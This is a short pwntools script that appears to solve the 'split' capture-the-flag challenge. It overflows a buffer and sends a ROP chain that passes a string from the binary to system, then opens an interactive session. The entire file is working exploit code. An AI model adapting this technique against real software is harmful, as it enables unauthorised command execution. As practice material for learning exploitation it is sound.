#/usr/bin/python
from pwn import *

#setup pwntools to work with binary
elf = context.binary = ELF('split')
io = process(elf.path)

# pwntools can build our rop chain for us
rop = ROP(elf)
rop.raw(0x0000000000400883)
rop.raw(elf.symbols['usefulString'])
rop.raw(elf.symbols['system'])
print rop.dump()

# show the rop chain and send the exploit
#print rop.dump()
exploit = 'A'* 0x28 + rop.chain()
exploit += 'C' * (0x60 - len(exploit))

io.send(exploit)
io.interactive()
